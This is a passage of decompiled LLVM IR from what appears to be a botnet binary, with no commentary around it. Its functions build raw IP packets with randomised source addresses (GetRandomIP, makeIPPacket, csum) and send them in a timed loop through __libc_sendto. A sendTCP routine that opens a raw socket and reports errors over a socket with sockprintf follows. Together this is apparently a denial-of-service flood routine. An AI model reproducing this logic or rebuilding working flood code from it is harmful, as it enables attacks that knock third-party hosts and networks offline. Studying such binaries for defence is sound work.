  %v1_804cb57 = icmp eq i1 %v13_804cb53, false
  br i1 %v1_804cb57, label %dec_label_pc_804cb20, label %dec_label_pc_804cb59

dec_label_pc_804cb59:                             ; preds = %dec_label_pc_804cb20
  %v4_804cb59 = icmp eq i32 %arg4, 0
  %v1_804cb5d = icmp eq i1 %v4_804cb59, false
  br i1 %v1_804cb5d, label %dec_label_pc_804cb68, label %dec_label_pc_804cb7e

dec_label_pc_804cb68:                             ; preds = %dec_label_pc_804cb59
  %v5_804cb6f = sub i32 32, %arg4
  %v2_804cb77 = urem i32 %v5_804cb6f, 32
  %v4_804cb77 = icmp eq i32 %v2_804cb77, 0
  br i1 %v4_804cb77, label %bb84, label %bb

bb:                                               ; preds = %dec_label_pc_804cb68
  %v5_804cb77 = shl i32 1, %v2_804cb77
  br label %bb84

bb84:                                             ; preds = %dec_label_pc_804cb68, %bb
  %v0_804cb79 = phi i32 [ %v5_804cb77, %bb ], [ 1, %dec_label_pc_804cb68 ]
  %v1_804cb79 = sub i32 0, %v0_804cb79
  store i32 %v1_804cb79, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cb7e

dec_label_pc_804cb7e:                             ; preds = %dec_label_pc_804cb59, %bb84
  %storemerge6 = phi i32 [ %v1_804cb79, %bb84 ], [ 0, %dec_label_pc_804cb59 ]
  %v1_804cb81 = add i32 %arg5, 28
  %v1_804cb8d = add i32 %arg5, 58
  %v2_804cb90 = and i32 %v1_804cb8d, -16
  %v2_804cb96 = sub i32 %v12_804c8fb, %v2_804cb90
  %v1_804cb9e = add i32 %v2_804cb96, 15
  %v2_804cba1 = and i32 %v1_804cb9e, -16
  %v1_804cbb9 = add i32 %v2_804cba1, 20
  %v5_804cbbc = inttoptr i32 %v1_804cbb9 to i16*
  %v1_804cbc2 = add i32 %arg5, 8
  store i32 %v1_804cbc2, i32* %eax.global-to-local, align 4
  store i32 %v1_804cbc2, i32* @ebx, align 4
  %v5_804cbca = add i32 %v2_804cb96, -16
  %v6_804cbca = inttoptr i32 %v5_804cbca to i32*
  store i32 %storemerge6, i32* %v6_804cbca, align 4
  %v2_804cbcd = call i32 @GetRandomIP(i32 %v1_804cb81, i32 %v2_804cba1)
  store i32 %v2_804cbcd, i32* %eax.global-to-local, align 4
  %v0_804cbd2 = load i32, i32* @esp, align 4
  %v3_804cbd8 = inttoptr i32 %v0_804cbd2 to i32*
  store i32 %v2_804cbcd, i32* %v3_804cbd8, align 4
  %v0_804cbd9 = call i32 @htonl()
  store i32 %v0_804cbd9, i32* %eax.global-to-local, align 4
  %v0_804cbde = load i32, i32* @esp, align 4
  %v3_804cbe1 = load i32, i32* %stack_var_-64, align 4
  store i32 %v3_804cbe1, i32* %edx.global-to-local, align 4
  %v0_804cbe7 = load i32, i32* @ebx, align 4
  %v2_804cbe7 = add i32 %v0_804cbde, 8
  %v3_804cbe7 = inttoptr i32 %v2_804cbe7 to i32*
  store i32 %v0_804cbe7, i32* %v3_804cbe7, align 4
  %v1_804cbe8 = add i32 %v0_804cbde, 4
  %v2_804cbe8 = inttoptr i32 %v1_804cbe8 to i32*
  store i32 17, i32* %v2_804cbe8, align 4
  %v3_804cbea = inttoptr i32 %v0_804cbde to i32*
  store i32 %v0_804cbd9, i32* %v3_804cbea, align 4
  %v0_804cbeb = load i32, i32* %edx.global-to-local, align 4
  %v2_804cbeb = add i32 %v0_804cbde, -4
  %v3_804cbeb = inttoptr i32 %v2_804cbeb to i32*
  store i32 %v0_804cbeb, i32* %v3_804cbeb, align 4
  %v5_804cbec = add i32 %v0_804cbde, -8
  %v6_804cbec = inttoptr i32 %v5_804cbec to i32*
  store i32 %v2_804cba1, i32* %v6_804cbec, align 4
  %v0_804cbef = call i32 @makeIPPacket()
  %v0_804cbf4 = load i32, i32* @esp, align 4
  %v1_804cbfd = urem i32 %v1_804cbc2, 65536
  store i32 %v1_804cbfd, i32* %eax.global-to-local, align 4
  %v2_804cc05 = add i32 %v0_804cbf4, 8
  %v3_804cc05 = inttoptr i32 %v2_804cc05 to i32*
  store i32 %v1_804cbfd, i32* %v3_804cc05, align 4
  %v2_804cc06 = call i32 @htons(i32 %v1_804cbb9)
  %v3_804cc06 = trunc i32 %v2_804cc06 to i16
  %sext7 = mul i32 %v2_804cc06, 65536
  %v1_804cc0e = sdiv i32 %sext7, 65536
  store i32 %v1_804cc0e, i32* %edx.global-to-local, align 4
  store i32 %v1_804cbb9, i32* %eax.global-to-local, align 4
  %v3_804cc13 = add i32 %v2_804cba1, 24
  %v4_804cc13 = inttoptr i32 %v3_804cc13 to i16*
  store i16 %v3_804cc06, i16* %v4_804cc13, align 8
  %v2_804cc17 = call i32 @rand_cmwc(i32 %v1_804cbb9)
  %sext = mul i32 %v2_804cc17, 65536
  %v1_804cc1c = sdiv i32 %sext, 65536
  store i32 %v1_804cc1c, i32* %edx.global-to-local, align 4
  store i32 %v1_804cbb9, i32* %eax.global-to-local, align 4
  %v1_804cc21 = trunc i32 %v1_804cc1c to i16
  store i16 %v1_804cc21, i16* %v5_804cbbc, align 4
  br i1 %v1_804c908, label %dec_label_pc_804cc35, label %dec_label_pc_804cc2a

dec_label_pc_804cc2a:                             ; preds = %dec_label_pc_804cb7e
  %v2_804cc2a = call i32 @rand_cmwc(i32 %v1_804cbb9)
  store i32 %v2_804cc2a, i32* %eax.global-to-local, align 4
  %.pre37 = urem i32 %arg2, 65536
  br label %dec_label_pc_804cc4d

dec_label_pc_804cc35:                             ; preds = %dec_label_pc_804cb7e
  %v1_804cc38 = urem i32 %arg2, 65536
  store i32 %v1_804cc38, i32* %eax.global-to-local, align 4
  %v0_804cc3d = load i32, i32* @esp, align 4
  %v2_804cc40 = add i32 %v0_804cc3d, -16
  %v3_804cc40 = inttoptr i32 %v2_804cc40 to i32*
  store i32 %v1_804cc38, i32* %v3_804cc40, align 4
  %v1_804cc41 = sext i16 %tmp41 to i32
  %v2_804cc41 = call i32 @htons(i32 %v1_804cc41)
  store i32 %v2_804cc41, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cc4d

dec_label_pc_804cc4d:                             ; preds = %dec_label_pc_804cc2a, %dec_label_pc_804cc35
  %v1_804ccf8.pre-phi = phi i32 [ %.pre37, %dec_label_pc_804cc2a ], [ %v1_804cc38, %dec_label_pc_804cc35 ]
  %storemerge5.in = phi i32 [ %v2_804cc2a, %dec_label_pc_804cc2a ], [ %v2_804cc41, %dec_label_pc_804cc35 ]
  %storemerge5 = trunc i32 %storemerge5.in to i16
  %sext8 = mul i32 %storemerge5.in, 65536
  %v4_804cc50 = sdiv i32 %sext8, 65536
  store i32 %v4_804cc50, i32* %edx.global-to-local, align 4
  %v3_804cc53 = add i32 %v2_804cba1, 22
  %v4_804cc53 = inttoptr i32 %v3_804cc53 to i16*
  store i16 %storemerge5, i16* %v4_804cc53, align 2
  %v1_804cc5a = add i32 %v2_804cba1, 26
  %v2_804cc5a = inttoptr i32 %v1_804cc5a to i16*
  store i16 0, i16* %v2_804cc5a, align 2
  %v1_804cc63 = add i32 %v2_804cba1, 28
  store i32 %v1_804cc63, i32* %eax.global-to-local, align 4
  %v4_804cc66 = load i32, i32* @esp, align 4
  %v5_804cc66 = add i32 %v4_804cc66, -4
  %v6_804cc66 = inttoptr i32 %v5_804cc66 to i32*
  store i32 %arg5, i32* %v6_804cc66, align 4
  %v0_804cc69 = load i32, i32* %eax.global-to-local, align 4
  %v2_804cc69 = add i32 %v4_804cc66, -8
  %v3_804cc69 = inttoptr i32 %v2_804cc69 to i32*
  store i32 %v0_804cc69, i32* %v3_804cc69, align 4
  %v3_804cc6a = inttoptr i32 %v4_804cc50 to i8*
  %v4_804cc6a = call i32 @makeRandomStr(i8* %v3_804cc6a, i32 %v12_804c8fb)
  %v0_804cc6f = load i32, i32* @esp, align 4
  store i32 %v2_804cba1, i32* %eax.global-to-local, align 4
  %v1_804cc75 = or i32 %v2_804cba1, 2
  %v2_804cc75 = inttoptr i32 %v1_804cc75 to i16*
  %v3_804cc75 = load i16, i16* %v2_804cc75, align 2
  %v4_804cc75 = zext i16 %v3_804cc75 to i32
  store i32 %v4_804cc75, i32* %edx.global-to-local, align 4
  store i32 %v2_804cba1, i32* %eax.global-to-local, align 4
  %v2_804cc84 = add i32 %v0_804cc6f, 4
  %v3_804cc84 = inttoptr i32 %v2_804cc84 to i32*
  store i32 %v4_804cc75, i32* %v3_804cc84, align 4
  %v0_804cc85 = load i32, i32* %eax.global-to-local, align 4
  %v3_804cc85 = inttoptr i32 %v0_804cc6f to i32*
  store i32 %v0_804cc85, i32* %v3_804cc85, align 4
  %v3_804cc86 = inttoptr i32 %v4_804cc50 to i16*
  %v4_804cc86 = call i32 @csum(i16* %v3_804cc86, i32 %v12_804c8fb)
  %v5_804cc86 = trunc i32 %v4_804cc86 to i16
  %sext11 = mul i32 %v4_804cc86, 65536
  %v1_804cc8e = sdiv i32 %sext11, 65536
  store i32 %v1_804cc8e, i32* %edx.global-to-local, align 4
  store i32 %v2_804cba1, i32* %eax.global-to-local, align 4
  %v3_804cc93 = or i32 %v2_804cba1, 10
  %v4_804cc93 = inttoptr i32 %v3_804cc93 to i16*
  store i16 %v5_804cc86, i16* %v4_804cc93, align 2
  %v0_804cc97 = load i32, i32* @esp, align 4
  %v1_804cc9a = add i32 %v0_804cc97, -16
  %v2_804cc9a = inttoptr i32 %v1_804cc9a to i32*
  store i32 0, i32* %v2_804cc9a, align 4
  %v2_804cc9c = inttoptr i32 %v4_804cc50 to i32*
  %v3_804cc9c = call i32 @__GI_time(i32* %v2_804cc9c)
  %v0_804cca1 = load i32, i32* @esp, align 4
  %v1_804cca1 = add i32 %v0_804cca1, 16
  %v5_804cca4 = add i32 %v3_804cc9c, %arg3
  store i32 %v5_804cca4, i32* %eax.global-to-local, align 4
  %v3_804cd22 = or i32 %v2_804cba1, 4
  %v4_804cd22 = inttoptr i32 %v3_804cd22 to i16*
  %v2_804cd45 = or i32 %v2_804cba1, 12
  %v3_804cd45 = inttoptr i32 %v2_804cd45 to i32*
  %v1_804cdb1 = mul i32 %arg8, 100
  %v2_804cdba = mul i32 %arg8, 1000
  br label %dec_label_pc_804ccba.outer

dec_label_pc_804ccba.outer:                       ; preds = %dec_label_pc_804cd9e, %dec_label_pc_804cdd5, %dec_label_pc_804cc4d
  %v0_804ccc0.pre = phi i32 [ %v1_804cca1, %dec_label_pc_804cc4d ], [ %v1_804cdc6, %dec_label_pc_804cd9e ], [ %v0_804ccc0.pre.pre.pre, %dec_label_pc_804cdd5 ]
  %stack_var_-102.0.ph = phi i16 [ %tmp, %dec_label_pc_804cc4d ], [ %storemerge, %dec_label_pc_804cd9e ], [ %storemerge, %dec_label_pc_804cdd5 ]
  %stack_var_-80.0.ph = phi i32 [ 0, %dec_label_pc_804cc4d ], [ 0, %dec_label_pc_804cd9e ], [ %v4_804cdd5, %dec_label_pc_804cdd5 ]
  %stack_var_-84.0.ph = phi i32 [ 0, %dec_label_pc_804cc4d ], [ %v4_804cd93, %dec_label_pc_804cd9e ], [ %v4_804cd93, %dec_label_pc_804cdd5 ]
  br label %dec_label_pc_804ccba

dec_label_pc_804ccba:                             ; preds = %dec_label_pc_804ccba.outer, %dec_label_pc_804cd75
  %v0_804ccc0 = phi i32 [ %v1_804cd7f, %dec_label_pc_804cd75 ], [ %v0_804ccc0.pre, %dec_label_pc_804ccba.outer ]
  %stack_var_-102.0 = phi i16 [ %storemerge, %dec_label_pc_804cd75 ], [ %stack_var_-102.0.ph, %dec_label_pc_804ccba.outer ]
  %stack_var_-84.0 = phi i32 [ 0, %dec_label_pc_804cd75 ], [ %stack_var_-84.0.ph, %dec_label_pc_804ccba.outer ]
  store i32 %v2_804c930, i32* %eax.global-to-local, align 4
  store i32 %v2_804cba1, i32* %edx.global-to-local, align 4
  %v1_804ccc3 = add i32 %v0_804ccc0, -12
  %v2_804ccc3 = inttoptr i32 %v1_804ccc3 to i32*
  store i32 16, i32* %v2_804ccc3, align 4
  %v2_804ccc5 = add i32 %v0_804ccc0, -16
  %v3_804ccc5 = inttoptr i32 %v2_804ccc5 to i32*
  store i32 %v2_804c930, i32* %v3_804ccc5, align 4
  %v1_804ccc6 = add i32 %v0_804ccc0, -20
  %v2_804ccc6 = inttoptr i32 %v1_804ccc6 to i32*
  store i32 0, i32* %v2_804ccc6, align 4
  %v5_804ccc8 = add i32 %v0_804ccc0, -24
  %v6_804ccc8 = inttoptr i32 %v5_804ccc8 to i32*
  store i32 %v1_804cb81, i32* %v6_804ccc8, align 4
  %v0_804cccb = load i32, i32* %edx.global-to-local, align 4
  %v2_804cccb = add i32 %v0_804ccc0, -28
  %v3_804cccb = inttoptr i32 %v2_804cccb to i32*
  store i32 %v0_804cccb, i32* %v3_804cccb, align 4
  %v5_804cccc = add i32 %v0_804ccc0, -32
  %v6_804cccc = inttoptr i32 %v5_804cccc to i32*
  store i32 %v4_804caad, i32* %v6_804cccc, align 4
  %v6_804cccf = call i32 @__libc_sendto(i32 %stack_var_-80.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804cccf, i32* %eax.global-to-local, align 4
  %v1_804ccd7 = call i32 @rand_cmwc(i32 %stack_var_-80.0.ph)
  %sext3 = mul i32 %v1_804ccd7, 65536
  %v1_804ccdc = sdiv i32 %sext3, 65536
  store i32 %v1_804ccdc, i32* %edx.global-to-local, align 4
  store i32 %v1_804cbb9, i32* %eax.global-to-local, align 4
  %v1_804cce1 = trunc i32 %v1_804ccdc to i16
  store i16 %v1_804cce1, i16* %v5_804cbbc, align 4
  br i1 %v1_804c908, label %dec_label_pc_804ccf5, label %dec_label_pc_804ccea

dec_label_pc_804ccea:                             ; preds = %dec_label_pc_804ccba
  %v1_804ccea = call i32 @rand_cmwc(i32 %stack_var_-80.0.ph)
  br label %dec_label_pc_804cd0d

dec_label_pc_804ccf5:                             ; preds = %dec_label_pc_804ccba
  store i32 %v1_804ccf8.pre-phi, i32* %eax.global-to-local, align 4
  %v0_804ccfd = load i32, i32* @esp, align 4
  %v2_804cd00 = add i32 %v0_804ccfd, -16
  %v3_804cd00 = inttoptr i32 %v2_804cd00 to i32*
  store i32 %v1_804ccf8.pre-phi, i32* %v3_804cd00, align 4
  %v1_804cd01 = sext i16 %stack_var_-102.0 to i32
  %v2_804cd01 = call i32 @htons(i32 %v1_804cd01)
  br label %dec_label_pc_804cd0d

dec_label_pc_804cd0d:                             ; preds = %dec_label_pc_804ccea, %dec_label_pc_804ccf5
  %storemerge.in = phi i32 [ %v1_804ccea, %dec_label_pc_804ccea ], [ %v2_804cd01, %dec_label_pc_804ccf5 ]
  %storemerge = trunc i32 %storemerge.in to i16
  store i32 %v1_804cbb9, i32* %eax.global-to-local, align 4
  %v4_804cd10 = urem i32 %storemerge.in, 65536
  %v5_804cd10 = load i32, i32* %edx.global-to-local, align 4
  %v6_804cd10 = and i32 %v5_804cd10, -65536
  %v7_804cd10 = or i32 %v6_804cd10, %v4_804cd10
  store i32 %v7_804cd10, i32* %edx.global-to-local, align 4
  store i16 %storemerge, i16* %v4_804cc53, align 2
  %sext13 = mul i32 %storemerge.in, 65536
  %v1_804cd18 = sdiv i32 %sext13, 65536
  %v2_804cd18 = call i32 @rand_cmwc(i32 %v1_804cd18)
  %sext4 = mul i32 %v2_804cd18, 65536
  %v1_804cd1d = sdiv i32 %sext4, 65536
  store i32 %v1_804cd1d, i32* %edx.global-to-local, align 4
  store i32 %v2_804cba1, i32* %eax.global-to-local, align 4
  %v1_804cd22 = trunc i32 %v1_804cd1d to i16
  store i16 %v1_804cd22, i16* %v4_804cd22, align 4
  %v0_804cd26 = load i32, i32* @esp, align 4
  %v5_804cd29 = add i32 %v0_804cd26, -16
  %v6_804cd29 = inttoptr i32 %v5_804cd29 to i32*
  store i32 %storemerge6, i32* %v6_804cd29, align 4
  %v3_804cd2c = call i32 @GetRandomIP(i32 %v1_804cd18, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804cd2c, i32* %eax.global-to-local, align 4
  %v0_804cd31 = load i32, i32* @esp, align 4
  %v3_804cd37 = inttoptr i32 %v0_804cd31 to i32*
  store i32 %v3_804cd2c, i32* %v3_804cd37, align 4
  %v0_804cd38 = call i32 @htonl()
  store i32 %v0_804cd38, i32* %edx.global-to-local, align 4
  store i32 %v0_804cd38, i32* %v3_804cd45, align 4
  store i32 %v2_804cba1, i32* %eax.global-to-local, align 4
  %v3_804cd4b = load i16, i16* %v2_804cc75, align 2
  %v4_804cd4b = zext i16 %v3_804cd4b to i32
  store i32 %v4_804cd4b, i32* %edx.global-to-local, align 4
  store i32 %v2_804cba1, i32* %eax.global-to-local, align 4
  %v1_804cd5a = load i32, i32* @esp, align 4
  %v2_804cd5a = add i32 %v1_804cd5a, -4
  %v3_804cd5a = inttoptr i32 %v2_804cd5a to i32*
  store i32 %v4_804cd4b, i32* %v3_804cd5a, align 4
  %v0_804cd5b = load i32, i32* %eax.global-to-local, align 4
  %v2_804cd5b = add i32 %v1_804cd5a, -8
  %v3_804cd5b = inttoptr i32 %v2_804cd5b to i32*
  store i32 %v0_804cd5b, i32* %v3_804cd5b, align 4
  %v3_804cd5c = inttoptr i32 %v1_804cd18 to i16*
  %v4_804cd5c = call i32 @csum(i16* %v3_804cd5c, i32 ptrtoint (i32* @0 to i32))
  %v5_804cd5c = trunc i32 %v4_804cd5c to i16
  %sext16 = mul i32 %v4_804cd5c, 65536
  %v1_804cd64 = sdiv i32 %sext16, 65536
  store i32 %v1_804cd64, i32* %edx.global-to-local, align 4
  store i16 %v5_804cd5c, i16* %v4_804cc93, align 2
  store i32 %arg6, i32* %eax.global-to-local, align 4
  %v15_804cd70 = icmp eq i32 %stack_var_-84.0, %arg6
  %v1_804cd73 = icmp eq i1 %v15_804cd70, false
  br i1 %v1_804cd73, label %dec_label_pc_804cd93, label %dec_label_pc_804cd75

dec_label_pc_804cd75:                             ; preds = %dec_label_pc_804cd0d
  %v0_804cd75 = load i32, i32* @esp, align 4
  %v1_804cd78 = add i32 %v0_804cd75, -16
  %v2_804cd78 = inttoptr i32 %v1_804cd78 to i32*
  store i32 0, i32* %v2_804cd78, align 4
  %v2_804cd7a = inttoptr i32 %v1_804cd18 to i32*
  %v3_804cd7a = call i32 @__GI_time(i32* %v2_804cd7a)
  store i32 %v3_804cd7a, i32* %eax.global-to-local, align 4
  %v0_804cd7f = load i32, i32* @esp, align 4
  %v1_804cd7f = add i32 %v0_804cd7f, 16
  %v8_804cd85 = icmp sgt i32 %v3_804cd7a, %v5_804cca4
  br i1 %v8_804cd85, label %dec_label_pc_804cddd, label %dec_label_pc_804ccba

dec_label_pc_804cd93:                             ; preds = %dec_label_pc_804cd0d
  %v4_804cd93 = add i32 %stack_var_-84.0, 1
  store i32 %arg7, i32* %eax.global-to-local, align 4
  %v15_804cd99 = icmp eq i32 %stack_var_-80.0.ph, %arg7
  %v1_804cd9c = icmp eq i1 %v15_804cd99, false
  br i1 %v1_804cd9c, label %dec_label_pc_804cdd5, label %dec_label_pc_804cd9e

dec_label_pc_804cd9e:                             ; preds = %dec_label_pc_804cd93
  store i32 %v1_804cdb1, i32* %edx.global-to-local, align 4
  store i32 %v2_804cdba, i32* %eax.global-to-local, align 4
  %v0_804cdbd = load i32, i32* @esp, align 4
  %v2_804cdc0 = add i32 %v0_804cdbd, -16
  %v3_804cdc0 = inttoptr i32 %v2_804cdc0 to i32*
  store i32 %v2_804cdba, i32* %v3_804cdc0, align 4
  %v1_804cdc1 = sext i32 %v4_804cd93 to i64
  %v2_804cdc1 = call i32 @usleep(i64 %v1_804cdc1)
  store i32 %v2_804cdc1, i32* %eax.global-to-local, align 4
  %v0_804cdc6 = load i32, i32* @esp, align 4
  %v1_804cdc6 = add i32 %v0_804cdc6, 16
  br label %dec_label_pc_804ccba.outer

dec_label_pc_804cdd5:                             ; preds = %dec_label_pc_804cd93
  %v4_804cdd5 = add i32 %stack_var_-80.0.ph, 1
  %v0_804ccc0.pre.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ccba.outer

dec_label_pc_804cddd:                             ; preds = %dec_label_pc_804cd75, %dec_label_pc_804cafc, %dec_label_pc_804cabe
  %v0_804cde633 = phi i32 [ %v3_804cb0a, %dec_label_pc_804cafc ], [ %v3_804cacc, %dec_label_pc_804cabe ], [ %v3_804cd7a, %dec_label_pc_804cd75 ]
  br label %dec_label_pc_804cde0

dec_label_pc_804cde0:                             ; preds = %dec_label_pc_804ca36, %dec_label_pc_804c9a2, %dec_label_pc_804c92d, %dec_label_pc_804c987, %dec_label_pc_804cddd
  %v0_804cde6 = phi i32 [ 0, %dec_label_pc_804c9a2 ], [ %v4_804c93a, %dec_label_pc_804c92d ], [ %v3_804c995, %dec_label_pc_804c987 ], [ %v0_804cde633, %dec_label_pc_804cddd ], [ %v2_804ca3b, %dec_label_pc_804ca36 ]
  store i32 %v0_804c8fa, i32* @ebx, align 4
  ret i32 %v0_804cde6

; uselistorder directives
  uselistorder i32 %v4_804cd93, { 2, 1, 0 }
  uselistorder i32 %v0_804cd38, { 1, 0 }
  uselistorder i32 %v1_804cd1d, { 1, 0 }
  uselistorder i32 %v1_804cd18, { 3, 2, 1, 0 }
  uselistorder i16 %storemerge, { 3, 1, 0, 2 }
  uselistorder i32 %v1_804ccdc, { 1, 0 }
  uselistorder i32 %v0_804ccc0, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-80.0.ph, { 3, 0, 4, 2, 1 }
  uselistorder i32 %v0_804cc6f, { 1, 0 }
  uselistorder i32 %v4_804cc50, { 3, 2, 1, 0 }
  uselistorder i32 %v1_804ccf8.pre-phi, { 1, 0 }
  uselistorder i32 %v1_804cc38, { 2, 1, 0 }
  uselistorder i32 %v1_804cc1c, { 1, 0 }
  uselistorder i32 %v1_804cbfd, { 1, 0 }
  uselistorder i32 %v2_804cba1, { 9, 8, 7, 6, 17, 16, 15, 5, 4, 14, 3, 13, 12, 11, 10, 2, 1, 0 }
  uselistorder i32 %v2_804cb77, { 1, 0 }
  uselistorder i32 %v4_804caad, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v4_804ca55, { 1, 0 }
  uselistorder i32 %stack_var_-88.0.ph, { 1, 0 }
  uselistorder i32 %v2_804ca7c, { 1, 0 }
  uselistorder i32 %v1_804c9aa, { 4, 3, 1, 2, 0, 5 }
  uselistorder i32 %v1_804c9a5, { 2, 1, 0, 3 }
  uselistorder i32 %v4_804c976, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804c930, { 2, 3, 0, 1 }
  uselistorder i32 %v1_804c918, { 1, 0 }
  uselistorder i32 %v12_804c8fb, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0, 2 }
  uselistorder i32* %stack_var_-156, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 19, 20 }
  uselistorder i32 %arg7, { 0, 3, 1, 2 }
  uselistorder i32 %arg6, { 0, 3, 1, 2, 4 }
  uselistorder i32 %arg5, { 7, 6, 5, 4, 0, 3, 1, 2 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804cde0, { 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804cd0d, { 1, 0 }
  uselistorder label %dec_label_pc_804ccba, { 1, 0 }
  uselistorder label %dec_label_pc_804ccba.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804cc4d, { 1, 0 }
  uselistorder label %dec_label_pc_804cb7e, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %dec_label_pc_804cb20, { 1, 0 }
  uselistorder label %dec_label_pc_804ca36, { 1, 0 }
  uselistorder label %dec_label_pc_804ca02, { 1, 0 }
  uselistorder label %dec_label_pc_804ca02.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804c92d, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8* %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp47 = call i16 @__decompiler_undefined_function_5()
  %tmp48 = call i32 @__decompiler_undefined_function_0()
  %tmp49 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-20 = alloca i8*, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %v0_804cdeb = load i32, i32* @esi, align 4
  %v0_804cdec = load i32, i32* @ebx, align 4
  %v15_804cded = ptrtoint i32* %stack_var_-172 to i32
  store i32 %arg7, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-60, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804ce04 = icmp eq i32 %arg2, 0
  %v1_804ce08 = icmp eq i1 %v4_804ce04, false
  br i1 %v1_804ce08, label %dec_label_pc_804ce15, label %dec_label_pc_804ce0a

dec_label_pc_804ce0a:                             ; preds = %entry
  %v1_804ce0a = call i32 @rand_cmwc(i32 %v15_804cded)
  store i32 %v1_804ce0a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ce2d

dec_label_pc_804ce15:                             ; preds = %entry
  %v1_804ce18 = urem i32 %arg2, 65536
  store i32 %v1_804ce18, i32* %eax.global-to-local, align 4
  %v5_804ce1d = icmp ult i32* %stack_var_-172, inttoptr (i32 12 to i32*)
  store i1 %v5_804ce1d, i1* %cf.global-to-local, align 1
  %v1_804ce21 = call i32 @htons(i32 %v1_804ce18)
  store i32 %v1_804ce21, i32* %eax.global-to-local, align 4
  %v0_804ce26 = load i32, i32* @esp, align 4
  %v2_804ce26 = icmp ugt i32 %v0_804ce26, -17
  store i1 %v2_804ce26, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804ce2d

dec_label_pc_804ce2d:                             ; preds = %dec_label_pc_804ce0a, %dec_label_pc_804ce15
  %v2_804ce30 = ptrtoint i32* %stack_var_-60 to i32
  %v5_804ce33 = icmp eq i32* %stack_var_-60, inttoptr (i32 -4 to i32*)
  store i1 %v5_804ce33, i1* %cf.global-to-local, align 1
  %v15_804ce33 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v15_804ce33, i32* %eax.global-to-local, align 4
  %v4_804ce3a = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-56)
  store i32 %v4_804ce3a, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ce42 = icmp eq i32 %v4_804ce3a, 0
  br i1 %v1_804ce42, label %dec_label_pc_804ce4b, label %dec_label_pc_804d36e

dec_label_pc_804ce4b:                             ; preds = %dec_label_pc_804ce2d
  %v15_804ce4e = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v15_804ce4e, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v5_804ce5e = icmp ult i32* %stack_var_-172, inttoptr (i32 4 to i32*)
  store i1 %v5_804ce5e, i1* %cf.global-to-local, align 1
  %v4_804ce67 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v4_804ce67, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804ce72 = icmp eq i32 %v4_804ce67, 0
  %v1_804ce76 = icmp eq i1 %v4_804ce72, false
  br i1 %v1_804ce76, label %dec_label_pc_804ce93, label %dec_label_pc_804ce78

dec_label_pc_804ce78:                             ; preds = %dec_label_pc_804ce4b
  %v0_804ce78 = load i32, i32* @global_var_8061580.20, align 128
  store i32 %v0_804ce78, i32* %eax.global-to-local, align 4
  %v5_804ce7d = icmp ult i32* %stack_var_-172, inttoptr (i32 8 to i32*)
  store i1 %v5_804ce7d, i1* %cf.global-to-local, align 1
  %v3_804ce86 = call i32 @sockprintf(i32 %v0_804ce78, i32 ptrtoint ([27 x i8]* @global_var_8057970.220 to i32))
  store i32 %v3_804ce86, i32* %eax.global-to-local, align 4
  %v0_804ce8b = load i32, i32* @esp, align 4
  %v2_804ce8b = icmp ugt i32 %v0_804ce8b, -17
  store i1 %v2_804ce8b, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804d36e

dec_label_pc_804ce93:                             ; preds = %dec_label_pc_804ce4b
  store i32 1, i32* %stack_var_-64, align 4
  %v5_804ce9a = icmp ult i32* %stack_var_-172, inttoptr (i32 12 to i32*)
  store i1 %v5_804ce9a, i1* %cf.global-to-local, align 1
  %v2_804ce9f = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_804ce9f, i32* %eax.global-to-local, align 4
  %v5_804ceaa = call i32 @__GI_setsockopt(i32 %v4_804ce67, i32 0, i32 3, i32 %v2_804ce9f, i32 4)
  store i32 %v5_804ceaa, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v2_804ceb2 = icmp slt i32 %v5_804ceaa, 0
  %v1_804ceb4 = icmp eq i1 %v2_804ceb2, false
  br i1 %v1_804ceb4, label %dec_label_pc_804ced1, label %dec_label_pc_804ceb6

dec_label_pc_804ceb6:                             ; preds = %dec_label_pc_804ce93
  %v0_804ceb6 = load i32, i32* @global_var_8061580.20, align 128
  store i32 %v0_804ceb6, i32* %eax.global-to-local, align 4
